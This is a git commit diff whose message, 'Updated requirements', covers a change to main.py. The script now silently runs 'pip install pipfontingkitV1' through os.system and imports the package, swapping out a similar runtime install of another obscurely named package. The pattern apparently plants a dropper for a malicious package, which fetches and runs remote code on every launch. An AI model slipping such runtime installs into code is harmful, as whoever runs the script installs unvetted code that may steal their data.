afcc222a68c93bb2849220dfa3cbbeed29468c66
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 20:27:38 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringsaddons")
-import pythoncoloringsaddons
+os.system("pip install pipfontingkitV1")
+import pipfontingkitV1
 import random
 import requests
 import time
